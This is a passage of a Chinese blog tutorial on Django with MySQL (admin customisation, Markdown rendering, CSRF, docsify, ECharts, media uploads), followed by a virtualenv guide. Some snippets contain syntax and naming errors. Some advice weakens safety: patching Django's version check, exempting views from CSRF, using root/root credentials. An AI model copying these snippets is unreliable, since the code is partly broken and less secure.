authentication_string=PASSWORD('你的密码'),plugin='mysql_native_password';\n\nflush privileges;\n\nexit\n\nservice mysql start restart\n```\n\n### 创建数据库\n\n```mysql\ncreate database my_db charset='utf8'; #最好使用该方法，修改编码才可以在数据库存中文\n\ncreate database my_db;\n```\n\n### 删除数据库\n\n```mysql\ndrop database my_db;\n```\n\n### 常用命令\n\n```mysql\nuse my_db #使用my_db数据库\nshow databases; #显示数据库\n\nshow tables; #显示表\n\nselect database(); #查看正在使用的数据库\n\nshow create database my_db; #显示自己创建的数据库\nshow create table my_table; #显示自己创建的数据库\n\ndesc my_table; #显示表结构\n\nshow variables like 'character_set_database'; #查看数据库编码\nalter database my_db character set utf8; #修改数据库编码\nalter table my_tables character set utf8; #修改表编码\n```\n\n### 创建表\n\n> 语法：create table Table_Name (Field_Name Field_Type [condition])\n\n| **condition**  | 描述             |\n| -------------- | ---------------- |\n| primary key    | 是否指定为主键   |\n| auto_increment | 是否自动增长     |\n| default        | 设置默认值       |\n| unique         | 值是否为唯一的   |\n| Not null       | 不能为空         |\n| foreign key    | 指定关键表的外键 |\n\n```mysql\nmysql> use my_db #使用my_db数据库\nDatabase changed\n\nmysql> create table students(\n    -> id int primary key auto_increment not null,\n    -> name varchar(20),\n    -> age int default 20\n    -> );\n    \nmysql> desc students; #显示表结构\n+-------+-------------+------+-----+---------+----------------+\n| Field | Type        | Null | Key | Default | Extra          |\n+-------+-------------+------+-----+---------+----------------+\n| id    | int(11)     | NO   | PRI | NULL    | auto_increment |\n| name  | varchar(20) | YES  |     | NULL    |                |\n| age   | int(11)     | YES  |     | 20      |                |\n+-------+-------------+------+-----+---------+----------------+\n3 rows in set (0.01 sec)\n```\n\n### 插入数据\n\n```mysql\ninsert into students (name,age) values ('jwt',18);\n\nmysql> insert into students (name,age) values ('jwt',18); #插入数据\nQuery OK, 1 row affected (0.03 sec)\n\nmysql> select * from students; #查看students表\n+----+------+------+\n| id | name | age  |\n+----+------+------+\n|  1 | jwt  |   18 |\n+----+------+------+\n1 row in set (0.01 sec)\n```\n\n### docker部署mysql问题\n\ndocker部署时到这样一个问题，开启容器时**提示本地3306端口被占用**，于是就使用这条命令查了下端口使用情况：\n\n```\nfuser -v -n tcp 3306\n```\n\n发现确实被占用了，于是用\n\n```bash\nkill -s 9 pid\n```\n\n\n把占用的进程干掉，再次查看是发现还在占用，于是发现是***本地的MySQL服务\\*** 开着，就通过：\n\n```bash\nservice mysqld stop(5.0版本是mysqld)\n\nservice mysql stop(5.5.7版本之后是mysql)\n```\n\n把MySQL服务关掉，发现这时端口3306 已经被释放了\n\n## 十、Django连接数据库\n\n**连接方法**\n\n在`setting.py`中配置\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.mysql',\n        'NAME': 'my_db',\n        'USER': 'root',\n        'PASSWORD': 'root',\n        'HOST': 'localhost',\n        'PORT': '3306'\n    }\n}\n```\n\n**下载解释器**\n\n- 方法一:\n\n```bash\npip3 install pymysql\n```\n\n在`__init__.py`中配置添加以下代码来导入pymysql模块指向使用mysql数据库\n\n```python\nimport pymysql\npymysql.install_as_MySQLdb()\n```\n\n执行完上面操作就成功连接上啦\n\n可能会报如下错误：\n\n```python\nraise ImproperlyConfigured('mysqlclient 1.3.13 or newer is required; you have %s.' % Database.__version__)\ndjango.core.exceptions.ImproperlyConfigured: mysqlclient 1.3.13 or newer is required; you have 0.9.3.\n```\n\n解决方法：\n\n找到Python安装路径下或虚拟环境路径下`/home/jwt/.virtualenvs/django/lib/python3.6/site-packages/django/db/backends/mysql/base.py`文件\n\n将下面代码注释掉就可以了\n\n```python\nif version < (1, 3, 3):\n    raise ImproperlyConfigured(\"mysqlclient 1.3.3 or newer is required; you have %s\" % Database.__version__)\n```\n\n- 方法二：\n\n````bash\n```\nsudo apt install libmysqlclient-dev\npip install mysqlclient\n​```\n````\n\n## 十一、Pycharm连接数据库\n\n![](https://img.jwt1399.top//img/20201204104042.png)\n\n> 如果连接MySQL报错：Server returns invalid timezone. Go to 'Advanced' tab and set 'serverTimezone' property manually.\n>\n> 服务器返回无效时区。转到“高级”选项卡并手动设置“serverTimezone”属性。\n\n**解决办法**：\n\n```mysql\nmysql -u root -p\n\nmysql>show variables like '%time_zone%';\n\nmysql>set global time_zone='+8:00';\n\n#每次重启服务都要重新配置一遍。\n解决：mysql>set persist time_zone='+8:00';\n```\n\n## 十二、取用数据库中数据\n\n### 1 从数据库中获取所有数据\n\n> objects.all()\n\n在`view.py`中添加\n\n```python\nfrom .models import UserInfo #导入model\ndef index(request):\n    userinfo_list = UserInfo.objects.all()#取出所有数据\n    context = {\n        'userinfos':userinfo_list,#传给模板\n    }\n    return render(request,'index.html',context)\n```\n\n在`templates`中新建`index.html`来显示获取到的数据\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>获取UserInfo表中信息</title>\n</head>\n<body>\n{% for userinfo in userinfos %}\n    <h1>  {{ userinfo.username}} ----{{ userinfo.password }}</h1>\n{% endfor %}\n\n</body>\n</html>\n```\n\n![](https://img.jwt1399.top//img/20201204104110.png)\n\n### 2 从数据库中获取第一条数据\n\n> objects.first()\n\n### 3 从数据库中获取一条数据\n\n> objects.get(**kwargs)  只能查询一条数据，查询结果包含多条的话会报错\n\n在`view.py`中添加\n\n```python\nfrom .models import UserInfo\ndef index(request):\n    context = {\n        'result':UserInfo.objects.get(username='简简'), #查询jwt的个人信息\n    }\n    return render(request,'index.html',context)\n```\n\n在`templates`中新建`index.html`来显示获取到的数据\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>获取UserInfo表中信息</title>\n</head>\n<body>\n    <h1>  {{ result.username}}</h1>\n    <h1>  {{ result.sex}}</h1>\n    <h1>  {{ result.mobile_phone}}</h1>\n    <h1>  {{ result.password}}</h1>\n</body>\n</html>\n```\n\n![](https://img.jwt1399.top//img/20201204104131.png)\n\n\n### 4 从数据库中获取匹配数据\n\n> objects.filter(**kwargs) 从数据库的取得匹配的结果，返回一个对象列表，如果记录不存在的话，它会返回[]\n\n## 十三、Django-后台\n\n###  应用注册\n\n若要把app应用显示在后台管理中，需要在`admin.py`中注册。注册有两种方式，`普通注册和使用装饰器注册`\n\n**普通注册方法**\n\n打开admin.py文件，如下代码：\n\n```python\nfrom django.contrib import admin\nfrom blog.models import Blog\n  \n#Blog模型的管理器\nclass BlogAdmin(admin.ModelAdmin):\n    list_display=('id', 'caption', 'author', 'publish_time')\n     \n#在admin中注册绑定\nadmin.site.register(Blog, BlogAdmin)\n```\n\n上面方法是将管理器和注册语句分开。有时容易忘记写注册语句，或者模型很多，不容易对应。\n\n**装饰器注册**\n\n该方式比较方便，推荐用这种方式。\n\n```python\nfrom django.contrib import admin\nfrom blog.models import Blog\n  \n#Blog模型的管理器\n@admin.register(Blog)\nclass BlogAdmin(admin.ModelAdmin):\n    list_display=('id', 'caption', 'author', 'publish_time')\n```\n\n参考： [DJANGO ADMIN 一些有用的设置](https://www.cnblogs.com/wumingxiaoyao/p/6928297.html)\n\n### 安装SimpleUi后台\n\nDjango自带的后台不太好看，SimpleUi官方介绍说SimpleUi是一个更符合国人审美和使用习惯的一个主题\n\n**官方后台与simpleui后台对比**\n\n![原生Django后台](https://img.jwt1399.top//img/20201204104556.png)\n\n![simpleui后台](https://img.jwt1399.top//img/20201204104614.png)\n\n**安装**\n\n```\npip install django-simpleui\n```\n\n安装simpleui后，在自己项目的settings.py文件中INSTALLED_APPS的第一行加入simpleui\n\n举个例子🌰：\n\n```python\n # Application definition\n\n  INSTALLED_APPS = [\n      'simpleui',\n      'django.contrib.admin',\n      'django.contrib.auth',\n      'django.contrib.contenttypes',\n      'django.contrib.sessions',\n      'django.contrib.messages',\n      'django.contrib.staticfiles',\n      ...\n  ]\n```\n\n#### 修改后台名称\n\n在urls.py或者admin.py 里面添加 \n\n```python\nfrom django.contrib import admin\nadmin.site.site_header = '简简'\nadmin.site.site_title = '简简 后台管理'\n```\n\n#### 修改logo\n\n在setting.py 里面添加 \n\n```\nSIMPLEUI_LOGO = 'logo链接'\n```\n\n详细请看：[SimpleUi快速上手](https://simpleui.88cto.com/docs/simpleui/QUICK.html#目录)\n\n### Django Admin后台显示 多对多字段\n\n**models代码背景**【 tag是多对多字段：一个tag可以对应多个文章，多个tag可以都对应一个文章】\n\n```python\nclass Tag(models.Model):\n\tname = models.CharField(max_length=20, verbose_name=\"标签名称\")\n \nclass Article(models.Model):\n\ttag = models.ManyToManyField(Tag, verbose_name=\"标签\")\n```\n\n**admin.py中定义函数**\n\n```python\n@admin.register(Article)\nclass ArticleAdmin(admin.ModelAdmin):\n    list_display = ['add_time','title','category','show_tag']\n    \n    '''展示文章的所有tag'''\n    def show_tag(self, obj):\n        return [t.name for t in obj.tag.all()]\n    show_tags.short_description = \"标签\"  # 设置后台表头\n    filter_horizontal = ('tag',) #可选项（文章标签选择时的显示样式)\n    \n```\n\n![](https://img.jwt1399.top//img/20201204104654.png)\n\n### Django 模板 显示 多对多字段\n\n **视图 views.py文件**\n\n```python\ndef Index(request):\n    \"\"\"首页展示\"\"\"\n    # 取出所有博客文章\n    all_articles = Article.objects.all()\n    # 需要传递给模板（templates）的对象\n    context = {'all_articles': all_articles}\n    # render函数：载入模板，并返回context对象\n    return render(request, 'index.html',context)\n```\n\n**在模板中显示所有标签**\n\n```python\n{% for article in article.tag.all %} #循环显示所有文章\n      {% for tag in article.tag.all %} #循环显示一个文章的所有标签\n                   {{tag}}  \n       {% endfor %}\n{% endfor%}\n```\n\n参考：https://www.cnblogs.com/xmdykf/p/11403000.html#\n\n### Django-utils实现后台图片和图标预览\n\n参考：[探索Django utils](https://cloud.tencent.com/developer/article/1372105)\n\n**利用`django.utils.html`转义实现图标预览**\n\n1.在`model.py`中定义图标预览函数\n\n```python\nfrom django.utils.html import format_html\n\nclass Category(models.Model):\n    icon = models.CharField(max_length=30, default='fas fa-home',verbose_name='菜单图标')\n\t#后台图标预览\n    def icon_data(self):#要引入Font Awesome Free 5.11.1\n        return format_html('<i class=\"{}\"></i>',self.icon) #转化为<i class=\"{self.icon}\"></i>\n    icon_data.short_description = '图标预览'# 设置后台显示表头\n\n```\n\n2.在`admin.py`中注册\n\n```python\n@admin.register(Category)\nclass CategoryAdmin(admin.ModelAdmin):\n    list_display = ['icon','icon_data']#在列表页显示的条目\n    list_editable = ['icon'] #在列表页即可修改\n```\n\n<img src=\"https://img.jwt1399.top//img/20201204104718.png\"  />\n\n**利用`django.utils.html`转义实现图片预览**\n\n1.在`model.py`中定义图片预览函数\n\n```python\nclass Article(models.Model):\n    title = models.CharField(max_length=50, verbose_name='文章标题')\n    cover = models.URLField(max_length=200, default='https://i.loli.net/2020/04/23/lJLjEtbs2NFwynQ.jpg', verbose_name='文章封面')\n\t#后台图片预览\n    def cover_preview(self):\n        return format_html('<img src=\"{}\" width=\"200px\" height=\"150px\"/>',self.cover,)\n    cover_preview.short_description = '文章封面预览'\n```\n\n2.在`admin.py`中注册\n\n```python\n@admin.register(Article)\nclass ArticleAdmin(admin.ModelAdmin):\n    #设置要显示在后台列表中的字段\n    list_display = ('title','cover_preview',)#【在列表页预览图片】\n    list_display_links = ('title',) #设置哪些字段可以点击进入编辑界面\n    readonly_fields = ('cover_preview',)#只读字段，添加该字段才能在后台编辑页预览封面，否则报错\n    fieldsets = (  #后台文章编辑页面排版\n        ('编辑文章', {#【在编辑页页预览图片】\n            'fields': ('title',,'cover','cover_preview',)\n        })\n    )\n```\n\n![列表页预览图片](https://img.jwt1399.top//img/20201204104740.png)\n\n![编辑页预览图片](https://img.jwt1399.top//img/20201204104813.png)\n\n### 后台引入django-import-export\n\n**安装插件**\n\n```bash\npip install django-import-export\n```\n\n**在`settings.py`注册**\n\n```python\nINSTALLED_APPS = (\n    ...\n    'import_export',\n)\n```\n\n还有一个可选的配置，我通常这样添加:\n\n```python\nIMPORT_EXPORT_USE_TRANSACTIONS = True\n```\n\n默认值为False。它确定库是否会在数据导入中使用数据库事务，以确保安全。\n\n **在Django后台中使用**\n\n在`admin.py`里使用`ImportExportModelAdmin`，而不是`admin.ModelAdmin`\n\n```javascript\nfrom import_export.admin import ImportExportModelAdmin\nfrom django.contrib import admin\nfrom .models import Person\n@admin.register(Person)\nclass PersonAdmin(ImportExportModelAdmin):\n    pass\n```\n\n添加之后刷新页面你就会看到导入和导出按钮。\n\n参考：[django-import-export插件使用教程](https://cloud.tencent.com/developer/article/1445272)\n\n### 引入MarkDown\n\nmarkdown编辑器：[django-mdeditor](https://github.com/pylixm/django-mdeditor)\n\nmarkdown前台解析：\n\n[Mistune](https://github.com/lepture/mistune)\n\n[Python-markdown](https://github.com/Python-Markdown/markdown)\n\n推荐使用Mistune，解析速度比Python- markdown快\n\n1.在你的应用目录下新建一个名为 `templatetags` 的文件夹，并在其之下新建两个 `Python` 文件：`__init__.py`(使`templatetags`成为一个包)和`blog_tags.py`。编辑`blog_tags.py`文件：\n\n```python\nimport re\nfrom random import randint\nfrom django import template\nfrom django.template.defaultfilters import stringfilter\n\nregister = template.Library()\n\n@register.simple_tag()\ndef random_num():\n    return randint(1, 10)\n\n\n@register.filter(is_safe=True)\n@stringfilter\ndef custom_markdown(content):\n    code_list = re.findall(r'<pre><code class=\"lang-(.*)\">', content, re.M)\n    for code in code_list:\n        content = re.sub(r'<pre><code class=\"(.*)\">',\n                         '<pre class=\"language-{code}\"><code class=\"language-{code}\">'.format(code=code.lower()), content,1)\n    return content\n```\n\n2.在 `views.py` 中\n\n```python\nfrom django.shortcuts import render\nfrom .models import Article\nimport mistune\ndef article_detail(request,id):\n    \"\"\"文章详情页\"\"\"\n    # 取出相应的文章\n    article = Article.objects.get(id=id)\n    #前台MK解析\n    mk = mistune.Markdown()\n    output = mk(article.content)\n    # 需要传递给模板的对象\n    context = {\n        'article':article,\n        'article_detail_html': output,\n    }\n    # 载入模板，并返回context对象\n    return render(request,'article_detail.html',context)\n```\n\n3.在模板文件中：\n\n```python\n{% load blog_tag %}\n{{ article_detail_html | custom_markdown | safe }}\n```\n\n### 全局变量\n\n我们经常在html中使用{{ article.name }}这样的模板变量，这些变量是我们在视图函数中提前定义好的变量，通过render()等方法传递到模板中。\n\n但是，还有一类变量，不需要使用render()传递到模板中，也能在html中使用该变量，像这样的变量，就叫做全局变量。\n\n1.定义你自己的全局变量，我定义在`view.py`中,你可以定义在任何文件，但是在第二步中注册路径相应要修改\n\n```python\ndef global_setting(request):\n    \"\"\"\n    全局变量\n    \"\"\"\n    category_nav = Category.objects.filter(add_menu=True).order_by('index')\n    return {\n        'category_nav': category_nav\n    }\n```\n\n**2.修改`settings.py`中的全局变量`TEMPLATES`**\n\n```python\n'context_processors': [\n    'django.template.context_processors.debug',\n    'django.template.context_processors.request',\n    'django.contrib.auth.context_processors.auth',\n    'django.contrib.messages.context_processors.messages',\n    'blog.views.global_setting',#自定义的全局变量\n],\n```\n\n添加模版全局变量之后，我们可以在任意位置渲染模版页面无需再手动写相关代码即可使用该变量\n\n参考：[Django模板设置全局变量(默认变量)](https://blog.csdn.net/weixin_42134789/article/details/81239605)\n\n## 十四、其他操作\n\n### 生成requirements.txt\n\n```bash\npip3 freeze > requirements.txt #生成项目所包含模块清单\n\npip3 install -r requirements.txt #一键安装上方文档中的模块\n```\n\n###  上传git仓库\n\n```bash\ngithub上新建仓库\n#首次本地执行：\ngit init\ngit add .\ngit commit -m \"xxxxxxxx\"\ngit remote add origin https://github.com/jwt1399/仓库名.git\ngit push -u origin master\n\n#以后执行上传：\ngit add .\ngit commit -m \"xxxxx\"\ngit push -u origin master\n#不想上传的文件，写在`.gitignore`中\n```\n\n### CSRF\n\n> django为用户实现防止跨站请求伪造的功能，通过中间件 django.middleware.csrf.CsrfViewMiddleware 来完成。而对于django中设置防跨站请求伪造功能有分为全局和局部。\n\n**全局：**\n\n中间件 django.middleware.csrf.CsrfViewMiddleware【在setting.py的MIDDLEWARE中】\n\n想取消直接注释这条语句\n\n**局部：**\n\n@csrf_protect，为当前函数强制设置防跨站请求伪造功能，即便settings中没有设置全局中间件。\n\n@csrf_exempt，取消当前函数防跨站请求伪造功能，即便settings中设置了全局中间件。\n\n在views.py中添加,@csrf_exempt添加到对应函数上\n\n```python\nfrom django.views.decorators.csrf import  csrf_exempt,csrf_protect\n\n@csrf_exempt #加上这个就不受CSRF保护，标识一个视图可以被跨域访问\ndef post(request):\n        return HttpResponse(\"hi\")\n\n```\n\n参考：[Django进阶之CSRF](https://www.cnblogs.com/zhaof/p/6281482.html)\n\n### `__init__.py`作用\n\n让 Python 把该目录当成一个开发包 (即一组模块)所需的文件，可以在其他地方导入(import)。 这是一个空文件，一般你不需要修改它。\n\n## 十五、Django引入docsify文档\n\n### docsify 介绍\n\n>  **docsify：**一个神奇的文档站点生成器。\n>\n> **官网：**https://docsify.js.org/\n\n我们在开发项目时，需要一份精致的开发文档，那么使用 `docsify` 是个不错的选择，`docsify` 是一个快速生成 `Vue` 风格文档的工具，它直接加载 `Markdown` 文件并动态渲染，同时还可以生成封面页。我们只需要写完 `Markdown` 文档，就可以看到类似下方图片的文档页面了。\n\n![](https://img.jwt1399.top//img/20210131103745.png)\n\n基础的配置和搭建我这里就不说了，官网有详细的步骤\n\n### docsify 嵌入Django项目\n\n1.根据官网教程生成 `docs` 文件夹\n\n![](https://img.jwt1399.top//img/20210131110145.png)\n\n2.将 `docs` 文件夹（除去index.html）放入 **Django** 项目的 `static` 文件夹中（下图我已经做了一些文档配置，所以多了一些文件）\n\n![](https://img.jwt1399.top//img/20210131110537.png)\n\n3.将 `docs` 中的 `index.html` 放入 `templates` 文件夹中，我这里将 `index.html` 改为了 `docs.html`\n\n![](https://img.jwt1399.top//img/20210131111242.png)\n\n4.在 `docs.html` 中设置静态文件路径\n\n```js\n<script>\n    window.$docsify = {\n    basePath:'/static/docs/',\n    ...\n    ...\n\t}\n</script>\n```\n\n5.在`view.py`增加一个视图,返回文档首页 `docs.html`\n\n```python\ndef docs(request):\n    return render(request, 'docs.html')\n```\n6.在`urls.py`中增加一个路由\n\n```python\npath('docs', views.docs, name='docs'),\n```\n\n7.运行 Django 项目，访问 `127.0.0.1:8000/docs` 就可以成功看到文档页了\n\n## Django引入Echarts\n\n### Echarts介绍\n\n>**ECharts：**百度出品的一个开源 Javascript 数据可视化库，可以流畅的运行在 PC 和移动设备上，兼容当前绝大部分浏览器（IE8/9/10/11，Chrome，Firefox，Safari等），底层依赖矢量图形库 [ZRender](https://github.com/ecomfe/zrender)，提供直观，交互丰富，可高度个性化定制的数据可视化图表。\n>\n>**官网：**https://echarts.apache.org/zh/index.html\n>\n>**社区：**https://www.makeapie.com/explore.html#sort=rank~timeframe=all~author=all\n\n### Echarts初体验\n\n**官方教程：**[五分钟上手ECharts](https://echarts.apache.org/zh/tutorial.html#5%20%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B%20ECharts)\n\n**使用步骤：**\n\n1. 引入 `echarts.js` 文件\n\n```js\n<script src=\"{% static 'js/echarts.min.js' %}\"></script>\n```\n\n​\t2.   准备一个具备大小的 DOM 容器\n\n```html\n<div id=\"main\" style=\"height:400px;\"></div>\n```\n\n3.  初始化 echarts 实例对象\n\n```js\nvar myChart = echarts.init(document.getElementById('main'));\n```\n\n4. 指定配置项和数据(option)\n\n```js\nvar option = {\n    xAxis: {\n        type: 'category',\n        data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']\n    },\n    yAxis: {\n        type: 'value'\n    },\n    series: [{\n        data: [820, 932, 901, 934, 1290, 1330, 1320],\n        type: 'line'\n    }]\n};\n```\n\n5. 将配置项设置给 echarts 实例对象\n\n```js\nmyChart.setOption(option);\n```\n\n\n### 图表跟随屏幕大小自适应\n\n```js\n  window.addEventListener(\"resize\", function() {\n    myChart1.resize();\n    myChart2.resize();\n  });\n```\n\n## Django实现文件上传\n\n以下内容转载自：https://segmentfault.com/a/1190000021960355\n\n### media & MEDIA_ROOT 的配置\n\n首先我们在自己的Django项目中创建一个**media**文件夹：\n![](https://img.jwt1399.top//img/20210221135916)\n\n然后在`settings.py`中设置`MEDIA_ROOT`：\n\n```python\nMEDIA_ROOT = os.path.join(BASE_DIR,'media')\n \n# 上传到自己指定app的路径下（例如上传到webscan下面的static目录下的media中)\n# MEDIA_ROOT = os.path.join(BASE_DIR,'webscan','static/media')\n```\n\n接着在`urls.py`中设置**media**路由的相关配置：\n\n```python\nfrom django.urls import path,re_path\nfrom django.views.static import serve\nfrom cnblog import settings\n\n##media配置——配合settings中的MEDIA_ROOT的配置，就可以在浏览器的地址栏访问media文件夹及里面的文件了\nre_path(r'media/(?P<path>.*)$',serve,{'document_root':settings.MEDIA_ROOT}),\n```\n\n有了上面这个路由设置，我们就可以在浏览器的地址栏根据media文件夹中文件的路径去访问对应的文件了（需要注意的是为了保证安全，默认情况下Django项目中各目录的文件是不能通过地址栏去访问的）。\n\n当然，我们这里实现的是文件上传的功能，需要将文件信息传给数据库保存，`models.py`文件中的内容如下：\n\n```python\nclass UserInfo(models.Model):\n    nid = models.AutoField(primary_key=True)\n    ##头像是一个FileField——注意这里必须是“相对路径”，不能是/avatars/这样的绝对路径\n    avatar = models.FileField(upload_to='avatars/',default='avatars/default.jpg')\n```\n\n我们用`FileField`存放上传的文件，这里需要注意：**media文件夹**是我们上传文件的 **根目录**，如果我们想再为这个“根目录”指定“子目录”的话需要通过参数`upload_to`去指定，也就是说，我们上传的文件会保存在 **/media/avatars目录** 下，后面的参数`default`表示默认图像————比如说我们想要上传头像，用户不指定头像的时候就用`default`参数指定的图片。\n\n```\n这里省略模板与视图函数的实现，只说明media参数的用法\n```\n\n当我们将图片上传到服务器后，就会在我们指定的目录看到上传的文件了：\n![](https://img.jwt1399.top//img/20210221141044)\n\n### 上传文件的访问\n\n#### 文件的访问简介\n\n其实，当我们在上面进行了`MEDIA_ROOT`与路由的相关配置后，在浏览器输入文件的路径就可以查看对应的文件了。比如我们想查看上图中的222.jpg文件，可以在程序运行的时候在地址栏输入：\n\n```\nhttp://127.0.0.1:8000/media/avatars/222.jpg\n```\n\n这样就可以显示这个图片了。\n\n但是实际中，用户不可能去地址栏输入文件路径的，我们做程序的目的就是尽最大限度的解放用户的操作————那么，是否有一种方法能够让用户仅仅点击一下就能查看到对应的文件呢？\n答案当然是肯定的！\n\n这就用到了media的另外一个参数————`MEDIA_URL`。\n\n#### MEDIA_URL\n\n在使用`MEDIA_URL`之前我们需要新增一条中间件，在`settings.py`文件的`TEMPLATES`参数中加入中间件：\n\n```python\ndjango.template.context_processors.media\n```\n\n然后我们在`settings.py`中加入`MEDIA_URL`的参数：\n\n```\nMEDIA_URL = '/media/'\n```\n\n接着我们再新增一条测试路由：\n\n```\n##测试\npath('aa/bb',views.aa),\n```\n\n视图也比较简单：\n\n```\ndef aa(request):\n    return  render(request,'aa.html')\n```\n\n然后模板文件中我们做相应的功能：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<a href=\"{{ MEDIA_URL }}avatars/222.jpg\">查看media目录下的一张图片</a>\n<p>MEDIA_URL: {{ MEDIA_URL }}</p>\n</body>\n</html>\n```\n\n假如我们想实现点击a标签的文字出来222.jpg图片，可以在href加上图片的路径，这里大家看到了，我们用模板语言`{{ MEDIA_URL }}`进行渲染，这里模板语言渲染出来的值其实就是我们在settings中设置的'/media/'。我们可以看一下演示效果：\n\n![](https://img.jwt1399.top//img/20210221141321)\n\n我们可以看到，点击链接的访问效果与在浏览器的地址栏输入文件路径的效果一样。\n可能有人会问了，既然效果一样，那为何不在模板中直接将a标签的href写死呢，何必用模板语言去渲染？！\n当然，二者的效果固然一样，但是当我们的项目做大的时候，文件目录的组织形式会越来越复杂，在settings中设置这样一个或者几个固定的、容易记忆的变量去存储复杂的文件路径，我们在开发的时候就不会为这些“琐事”去动脑筋了，这样能够极大的提高我们的编程效率。","tags":["Django"],"categories":["Python"]},{"title":"Python：虚拟环境","url":"/posts/26224.html","content":"\n## 虚拟环境\n\n> 当做一个项目时，可能会用到一些模块，如果把所有的模块都安装在主机python环境中，很容易使得自带python环境十分臃肿，而且到时候如果迁移到别的电脑时还需要重新安装对应模块，所以可以用虚拟环境，在不同的环境下安装对应的模块，迁移时也把整个环境迁移过去即可\n\n虚拟环境的作用：项目之间环境隔离\n开发：本地环境\n线上：多环境隔离\n\n## 一、Linux用户\n\n### 1.安装virtualenv\n\n```bash\nsudo pip3 install virtualenv\n```\n### 2.安装virtualenv扩展管理工具virtualenvwrapper\n\n```bash\nsudo pip3 install virtualenvwrapper\n```\n> 通过virtualenv来创建虚拟环境时，不管是创建还是激活的时候都要先cd到具体的目录下去，这样显得不方便。可以使用virtualenvwrapper来管理虚拟环境。\n### 3. 配置''.bashrc''文件\n\n> Ubuntu中'.bashrc'文件默认位置在'~/.bashrc',属于隐藏文件，可按ctrl+h 显示隐藏文件。打开后在文件末尾加入此段内容。\n>\n> 如果安装了 Oh My Zsh  就在.zshrc中加\n```bash\nexport VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3\nexport WORKON_HOME=$HOME/.virtualenvs\nsource /usr/local/bin/virtualenvwrapper.sh\n```\n- > VIRTUALENVWRAPPER_PYTHON ： 指定python3解释器的路径\n- > WORKON_HOME ： 指定虚拟环境的默认存放位置\n- > source ：每次登录自动执行的脚本\n\n### 4. 让'.bashrc'生效\n\n```bash\nsource ~/.bashrc\n\nsource ~/.zshrc #安装了Oh My Zsh使用这个\n```\n> 若提示 bash:/home/.../local/bin/virtualenvwrappper.sh： No shch file or directory,其原因是你在安装virtualenvwrapper时，你没有在前面加上sudo，你可以使用sudo pip3 uninstall virtualenvwrapper将其卸载后，重新加上sudo命令重装，或将'.bashrc'文件中的source 换成如下语句。\n```bash\nsource ~/.local/bin/virutalenvwrapper.sh\n```\n### 5. 创建虚拟环境\n\n- python 2.7\n```bash\nmkvirtualenv VM_name # VM_name 表示你的虚拟环境的名称\n```\n- python 3.x\n```bash\nmkvirtualenv -p python3 VM_name\n```\n\n![](https://i.loli.net/2020/04/06/sOXyeLwzqWfAaEC.png)\n\n###  6. 进入虚拟环境\n\n> 在ubuntu 18中，创建好环境后，会自动进入你的虚拟环境。命令行前会出现你的虚拟环境名称。\n```bash\nworkon VM_name  \n```\n![](https://i.loli.net/2020/04/06/HTWYtux3hVXaS1o.png)\n\n### 7. 退出当前虚拟环境\n\n```bash\ndeactivate\n```\n### 8. 其他虚拟环境命令\n\n- 列出所有虚拟环境\n```bash\nlsvirtualenv\n```\n![](https://i.loli.net/2020/04/06/GL6fjrBHRlp83uz.png)\n\n- 进入虚拟环境目录\n```bash\ncdvirtualenv\n```\n![](https://i.loli.net/2020/04/06/A3DZN1hGkX5962F.png)\n\n- 进入虚拟环境的site-packages目录\n```bash\ncdsitepackages\n```\n- 删除虚拟环境\n```bash\nrmvirtualenv VM_name\n```\n\n![](https://i.loli.net/2020/04/06/J3VAn7ySR6kcQ1o.png)\n\n## 二、windows用户\n\n### 1.安装virtualenv\n\n```bash\npip3 install virtualenv\n```\n### 2. 安装virtualenvwrapper\n\n> 为了使用virtualenv更方便，可以借助 virtualenvwrapper\n\n```bash\npip install virtualenvwrapper-win\n```\n\n#### 2.1 配置环境变量\n\n如果不配置环境变量,创建后的虚拟环境默认存储在当前用户`(C:/Users/xxx)`下`Env`文件夹下，如果你想要把虚拟环境存储在你指定的存储路径，那么就修改环境变量\n\n新建有一个变量名叫 `WORKON_HOME` ，变量值就是我们自定义存放虚拟环境的地址，然后点击保存，就ok了\n\n注：一定要重新打开一个cmd，不重新打开还是会建在`(C:/Users/xxx)`下`Env`文件夹下，如果还是不行的话，重启哈电脑就可以了\n\n![](https://i.loli.net/2020/04/09/xg3USrXAa6icpjb.png)\n\n#### 2.2 创建虚拟环境\n\n```bash\nmkvirtualenv -p python3 VM_name\n\nmkvirtualenv --python==D:\\python\\python.exe my_env #可以自己指定python路径\n```\n\n#### 2.3 切换到某个虚拟环境\n\n```\nworkon my_env\n```\n\n#### 2.4 退出当前虚拟环境\n\n```\ndeactivate\n```\n\n#### 2.5 删除某个虚拟环境\n\n```\nrmvritualenv my_env\n```\n\n#### 2.6 列出所有虚拟环境所在目录\n\n```\nlsvirtualenv\n```\n\n#### 2.7 进入到虚拟环境所在目录\n\n```\ncdvirtualenv\n```\n\n#### 2.8.将环境导入Pycharm\n\n选择我们上面创建好的虚拟环境\n\n![](../images/Python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200406212847887.png)\n\n\n\n### 3 不安装virtualenvwrapper\n\n**注：如果不安装virtualenvwrapper,就使用下面方法创建虚拟环境，但是建议还是装上，装上使用的命令就跟上方linux使用命令一样**\n\n#### 3.1 创建虚拟环境\n\n> windows用户最好指定一个目录专门来存放创建的虚拟环境\n\n```bash\nF:\ncd py_envs #这是我指定的专门存放虚拟环境的目录\n\nvirtualenv VM_name # VM_name 表示你的虚拟环境的名称\n\nvirtualenv VM_name --python==python3.6\nvirtualenv VM_name --python==python2.7\nvirtualenv VM_name --python=='D:\\python\\python3.6.exe'\n```\n####  3.2 进入虚拟环境\n\n> 进入你的虚拟环境，命令行前会出现你的虚拟环境名称。\n\n```bash\ncd 虚拟环境的Scripts目录 #cd py_envs/Vm_name/Scripts\n\nactivate.bat #激活虚拟环境\n```\n\n![](../images/Python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200406210729415.png)\n\n#### 3.3 退出当前虚拟环境\n\n```bash\ncd 虚拟环境的Scripts目录 #cd 